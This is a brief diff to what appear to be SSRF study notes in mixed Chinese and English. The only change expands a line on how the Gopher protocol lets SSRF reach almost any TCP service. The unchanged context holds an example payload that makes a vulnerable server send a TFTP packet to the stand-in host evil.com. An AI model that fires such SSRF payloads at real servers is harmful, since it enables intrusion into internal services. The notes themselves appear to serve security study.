@@ -39,7 +39,7 @@ SSRFserver -> attacker      【4】程序逻辑如果将req2的真实响应内�
     * `http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
 
 
-Gopher协议 - 重要作用:
+Gopher协议 - 重要作用:几乎可与任意TCP service交互
 (1)指定监听`ip` `port` `bytes`
 (2)you can exploit a SSRF to communicate with any TCP service.
 
